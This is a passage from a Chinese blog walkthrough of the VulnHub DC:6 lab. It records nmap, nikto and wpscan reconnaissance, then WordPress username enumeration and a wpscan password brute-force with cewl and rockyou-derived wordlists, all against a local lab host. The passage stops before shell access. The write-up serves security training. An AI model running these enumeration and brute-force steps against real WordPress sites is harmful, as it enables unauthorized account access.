<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="google-site-verification" content="JleqOUPaJdGpfRPLH4e3NfODV87Fmag6pJBPvxKQKEc"><title>[vulnhub]  DC:6 | Terminal-001 | T3yT3y</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="/js/gitalk.js"></script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Brands';
 src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Free';
 src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[vulnhub]  DC:6</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-06-03T11:17:45.381Z" id="date"> 2023-06-03</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-06-03T11:48:01.370Z" id="updated"> 2023-06-03</time></div></span><br><span>Word Count: <div class="control">5.4k</div></span><br><span>Read Time: <div class="control">30 min</div></span></div></div><hr><div id="post-content"><p class='item-img' data-src='/pic/cai.jpg'><img src="/pic/cai.jpg" alt="cai"></p>
<span id="more"></span>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>DC系列第6台机子。主要内容是对wordpress里一些插件及工具的利用拿shell，提权部分就考信息收集能力吧。</p>
<p>开始之前别忘了在<code>/etc/hosts</code>里加上wordy对应的IP，不然会出问题。</p>
<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>Port Scan:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-02 21:57 CST<br>Warning: 192.168.56.115 giving up on port because retransmission <span class="hljs-built_in">cap</span> hit (10).<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.115<br>Host is up (0.00075s latency).<br>Not shown: 37431 filtered tcp ports (no-response), 28102 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:E1:6F:2C (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 110.00 seconds<br></code></pre></td></tr></table></figure>

<p>TCP, Service, OS Scan:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-02 21:59 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.115<br>Host is up (0.00072s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)<br>80/tcp open  http    Apache httpd 2.4.25 ((Debian))<br>MAC Address: 08:00:27:E1:6F:2C (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 9.97 seconds<br></code></pre></td></tr></table></figure>

<p>UDP Scan:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-02 21:59 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.115<br>Host is up (0.0010s latency).<br>All 1000 scanned ports on 192.168.56.115 are <span class="hljs-keyword">in</span> ignored states.<br>Not shown: 958 closed udp ports (port-unreach), 42 open|filtered udp ports (no-response)<br>MAC Address: 08:00:27:E1:6F:2C (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 1042.12 seconds<br></code></pre></td></tr></table></figure>

<p>Simple Vuln Scan:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-03 14:12 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.115<br>Host is up (0.00023s latency).<br>Not shown: 998 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>|_http-stored-xss: Couldn<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.<br>| http-wordpress-users: <br>| Username found: admin<br>| Username found: graham<br>| Username found: mark<br>| Username found: sarah<br>| Username found: jens<br>|_Search stopped at ID <span class="hljs-comment">#25. Increase the upper limit if necessary with &#x27;http-wordpress-users.limit&#x27;</span><br>| http-enum: <br>|   /wp-login.php: Possible admin folder<br>|   /readme.html: Wordpress version: 2 <br>|   /wp-includes/images/rss.png: Wordpress version 2.2 found.<br>|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.<br>|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.<br>|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.<br>|   /wp-login.php: Wordpress login page.<br>|   /wp-admin/upgrade.php: Wordpress login page.<br>|_  /readme.html: Interesting, a readme.<br>|_http-csrf: Couldn<span class="hljs-string">&#x27;t find any CSRF vulnerabilities.</span><br><span class="hljs-string">MAC Address: 08:00:27:E1:6F:2C (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 32.25 seconds</span><br></code></pre></td></tr></table></figure>

<p>nikto Vuln Scan:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">- Nikto v2.5.0<br>---------------------------------------------------------------------------<br>+ Target IP:          192.168.56.115<br>+ Target Hostname:    192.168.56.115<br>+ Target Port:        80<br>+ Start Time:         2023-06-03 14:13:20 (GMT8)<br>---------------------------------------------------------------------------<br>+ Server: Apache/2.4.25 (Debian)<br>+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options<br>+ /: Uncommon header <span class="hljs-string">&#x27;x-redirect-by&#x27;</span> found, with contents: WordPress.<br>+ /: The X-Content-Type-Options header is not <span class="hljs-built_in">set</span>. This could allow the user agent to render the content of the site <span class="hljs-keyword">in</span> a different fashion to the MIME <span class="hljs-built_in">type</span>. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/<br>+ Root page / redirects to: http://wordy/<br>+ /index.php?: Drupal Link header found with value: ARRAY(0x5574d9921688). See: https://www.drupal.org/<br>+ No CGI Directories found (use <span class="hljs-string">&#x27;-C all&#x27;</span> to force check all possible <span class="hljs-built_in">dirs</span>)<br>+ Apache/2.4.25 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL <span class="hljs-keyword">for</span> the 2.x branch.<br>+ /: Web Server returns a valid response with junk HTTP methods <span class="hljs-built_in">which</span> may cause <span class="hljs-literal">false</span> positives.<br>+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/<br>+ /wp-links-opml.php: This WordPress script reveals the installed version.<br>+ /license.txt: License file found may identify site software.<br>+ /wp-login.php?action=register: Cookie wordpress_test_cookie created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies<br>+ /wp-login.php: Wordpress login found.<br>+ 8102 requests: 0 error(s) and 11 item(s) reported on remote host<br>+ End Time:           2023-06-03 14:13:50 (GMT8) (30 seconds)<br>---------------------------------------------------------------------------<br>+ 1 host(s) tested<br></code></pre></td></tr></table></figure>

<p>web fingerprint Scan:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://wordy [200 OK] Apache[2.4.25], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[192.168.56.115], JQuery[1.12.4], MetaGenerator[WordPress 5.1.1], PoweredBy[WordPress], Script[text/javascript], Title[Wordy &amp;<span class="hljs-comment">#8211; Just another WordPress site], UncommonHeaders[link], WordPress[5.1.1]</span><br></code></pre></td></tr></table></figure>

<p>看下来还是有挺多信息的。首先端口开了22和80，漏扫和网页指纹识别也识别出来了网站是用wordpress 5.1.1版本搭建的，并且还把用户名都给爆出来了。</p>
<p>既然用的是wordpress，当然wpscan会出手。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/DC/6/workSpace]<br>└─$ sudo wpscan --url http://wordy -e                                                              <br>_______________________________________________________________<br>         __          _______   _____<br>         \ \        / /  __ \ / ____|<br>          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®<br>           \ \/  \/ / |  ___/ \___ \ / __|/ _` | <span class="hljs-string">&#x27;_ \</span><br><span class="hljs-string">            \  /\  /  | |     ____) | (__| (_| | | | |</span><br><span class="hljs-string">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span><br><span class="hljs-string"></span><br><span class="hljs-string">         WordPress Security Scanner by the WPScan Team</span><br><span class="hljs-string">                         Version 3.8.22</span><br><span class="hljs-string">       Sponsored by Automattic - https://automattic.com/</span><br><span class="hljs-string">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="hljs-string">_______________________________________________________________</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] It seems like you have not updated the database for some time.</span><br><span class="hljs-string">[?] Do you want to update now? [Y]es [N]o, default: [N]Y</span><br><span class="hljs-string">[i] Updating the Database ...</span><br><span class="hljs-string">[i] Update completed.</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] URL: http://wordy/ [192.168.56.115]</span><br><span class="hljs-string">[+] Started: Sat Jun  3 14:28:44 2023</span><br><span class="hljs-string"></span><br><span class="hljs-string">Interesting Finding(s):</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Headers</span><br><span class="hljs-string"> | Interesting Entry: Server: Apache/2.4.25 (Debian)</span><br><span class="hljs-string"> | Found By: Headers (Passive Detection)</span><br><span class="hljs-string"> | Confidence: 100%</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] XML-RPC seems to be enabled: http://wordy/xmlrpc.php</span><br><span class="hljs-string"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="hljs-string"> | Confidence: 100%</span><br><span class="hljs-string"> | References:</span><br><span class="hljs-string"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="hljs-string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span><br><span class="hljs-string"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span><br><span class="hljs-string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span><br><span class="hljs-string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] WordPress readme found: http://wordy/readme.html</span><br><span class="hljs-string"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="hljs-string"> | Confidence: 100%</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] The external WP-Cron seems to be enabled: http://wordy/wp-cron.php</span><br><span class="hljs-string"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="hljs-string"> | Confidence: 60%</span><br><span class="hljs-string"> | References:</span><br><span class="hljs-string"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="hljs-string"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] WordPress version 5.1.1 identified (Insecure, released on 2019-03-13).</span><br><span class="hljs-string"> | Found By: Rss Generator (Passive Detection)</span><br><span class="hljs-string"> |  - http://wordy/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.1.1&lt;/generator&gt;</span><br><span class="hljs-string"> |  - http://wordy/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.1.1&lt;/generator&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] WordPress theme in use: twentyseventeen</span><br><span class="hljs-string"> | Location: http://wordy/wp-content/themes/twentyseventeen/</span><br><span class="hljs-string"> | Last Updated: 2023-03-29T00:00:00.000Z</span><br><span class="hljs-string"> | Readme: http://wordy/wp-content/themes/twentyseventeen/README.txt</span><br><span class="hljs-string"> | [!] The version is out of date, the latest version is 3.2</span><br><span class="hljs-string"> | Style URL: http://wordy/wp-content/themes/twentyseventeen/style.css?ver=5.1.1</span><br><span class="hljs-string"> | Style Name: Twenty Seventeen</span><br><span class="hljs-string"> | Style URI: https://wordpress.org/themes/twentyseventeen/</span><br><span class="hljs-string"> | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...</span><br><span class="hljs-string"> | Author: the WordPress team</span><br><span class="hljs-string"> | Author URI: https://wordpress.org/</span><br><span class="hljs-string"> |</span><br><span class="hljs-string"> | Found By: Css Style In Homepage (Passive Detection)</span><br><span class="hljs-string"> |</span><br><span class="hljs-string"> | Version: 2.1 (80% confidence)</span><br><span class="hljs-string"> | Found By: Style (Passive Detection)</span><br><span class="hljs-string"> |  - http://wordy/wp-content/themes/twentyseventeen/style.css?ver=5.1.1, Match: &#x27;</span>Version: 2.1<span class="hljs-string">&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Enumerating Vulnerable Plugins (via Passive Methods)</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] No plugins Found.</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)</span><br><span class="hljs-string"> Checking Known Locations - Time: 00:00:00 &lt;=============================================&gt; (500 / 500) 100.00% Time: 00:00:00</span><br><span class="hljs-string">[+] Checking Theme Versions (via Passive and Aggressive Methods)</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] No themes Found.</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Enumerating Timthumbs (via Passive and Aggressive Methods)</span><br><span class="hljs-string"> Checking Known Locations - Time: 00:00:04 &lt;===========================================&gt; (2575 / 2575) 100.00% Time: 00:00:04</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] No Timthumbs Found.</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Enumerating Config Backups (via Passive and Aggressive Methods)</span><br><span class="hljs-string"> Checking Config Backups - Time: 00:00:00 &lt;==============================================&gt; (137 / 137) 100.00% Time: 00:00:00</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] No Config Backups Found.</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Enumerating DB Exports (via Passive and Aggressive Methods)</span><br><span class="hljs-string"> Checking DB Exports - Time: 00:00:00 &lt;====================================================&gt; (71 / 71) 100.00% Time: 00:00:00</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] No DB Exports Found.</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to &quot;Plain&quot; for those to be detected)</span><br><span class="hljs-string"> Brute Forcing Attachment IDs - Time: 00:00:01 &lt;=========================================&gt; (100 / 100) 100.00% Time: 00:00:01</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] No Medias Found.</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Enumerating Users (via Passive and Aggressive Methods)</span><br><span class="hljs-string"> Brute Forcing Author IDs - Time: 00:00:00 &lt;===============================================&gt; (10 / 10) 100.00% Time: 00:00:00</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] User(s) Identified:</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] admin</span><br><span class="hljs-string"> | Found By: Rss Generator (Passive Detection)</span><br><span class="hljs-string"> | Confirmed By:</span><br><span class="hljs-string"> |  Wp Json Api (Aggressive Detection)</span><br><span class="hljs-string"> |   - http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="hljs-string"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="hljs-string"> |  Login Error Messages (Aggressive Detection)</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] sarah</span><br><span class="hljs-string"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="hljs-string"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] graham</span><br><span class="hljs-string"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="hljs-string"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] mark</span><br><span class="hljs-string"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="hljs-string"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] jens</span><br><span class="hljs-string"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="hljs-string"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="hljs-string"></span><br><span class="hljs-string">[!] No WPScan API Token given, as a result vulnerability data has not been output.</span><br><span class="hljs-string">[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Finished: Sat Jun  3 14:28:56 2023</span><br><span class="hljs-string">[+] Requests Done: 3455</span><br><span class="hljs-string">[+] Cached Requests: 8</span><br><span class="hljs-string">[+] Data Sent: 892.988 KB</span><br><span class="hljs-string">[+] Data Received: 13.49 MB</span><br><span class="hljs-string">[+] Memory used: 299.664 MB</span><br><span class="hljs-string">[+] Elapsed time: 00:00:12</span><br></code></pre></td></tr></table></figure>

<p>用户名和之前扫描结果对上了，其他有漏洞的插件以及备份啥的没有发现。既然拿到用户名了，当然得试试能不能爆破一下登录了。</p>
<h2 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h2><h3 id="字典登录爆破"><a href="#字典登录爆破" class="headerlink" title="字典登录爆破"></a>字典登录爆破</h3><p>要爆破首先要有字典，根据之前打DC系列机子的经验，我们可以先根据网站信息使用<code>cewl</code>生成一个字典。先试试这个字典能不能成，不行再直接用rockyou慢慢跑吧。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/DC/6/workSpace]<br>└─$ cewl http://wordy &gt; cewlpass<br></code></pre></td></tr></table></figure>

<p>然后把之前的用户名存到一个username文件里。爆破一下试试。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">┌──(kali㉿kali)-[~/vulnhub/DC/6/workSpace]<br>└─$ sudo wpscan --url http://wordy -U username -P cewlpass                                   <br>_______________________________________________________________<br>         __          _______   _____<br>         \ \        / /  __ \ / ____|<br>          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®<br>           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#x27;_ \<br>            \  /\  /  | |     ____) | (__| (_| | | | |<br>             \/  \/   |_|    |_____/ \___|\__,_|_| |_|<br><br>         WordPress Security Scanner by the WPScan Team<br>                         Version 3.8.22<br>       Sponsored by Automattic - https://automattic.com/<br>       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart<br>_______________________________________________________________<br><br>[+] URL: http://wordy/ [192.168.56.115]<br>[+] Started: Sat Jun  3 14:55:39 2023<br><br>......<br><br>[+] Performing password attack on Xmlrpc against 5 user/s<br>Trying mark / here Time: 00:00:09 &lt;======================================================&gt; (445 / 445) 100.00% Time: 00:00:09<br><br>[i] No Valid Passwords Found.<br><br>[!] No WPScan API Token given, as a result vulnerability data has not been output.<br>[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register<br><br>[+] Finished: Sat Jun  3 14:55:53 2023<br>[+] Requests Done: 618<br>[+] Cached Requests: 5<br>[+] Data Sent: 264.483 KB<br>[+] Data Received: 632.724 KB<br>[+] Memory used: 252.391 MB<br>[+] Elapsed time: 00:00:14<br><br></code></pre></td></tr></table></figure>

<p>可惜没有成功，那我们就拿rockyou跑吧。</p>
<p>但是rockyou太大了，跑完到猴年马月。但是幸好作者给我们了一个小提示：</p>
<blockquote>
<h3 id="CLUE"><a href="#CLUE" class="headerlink" title="CLUE"></a>CLUE</h3><p>OK, this isn’t really a clue as such, but more of some “we don’t want to spend five years waiting for a certain process to finish” kind of advice for those who just want to get on with the job.</p>
<p>cat &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt | grep k01 &gt; passwords.txt That should save you a few years. ;-)</p>
</blockquote>
<p>说明我们要的密码部分在有‘k01’的部分。我们用这个rockyou的部分字典试着跑一下。</p>
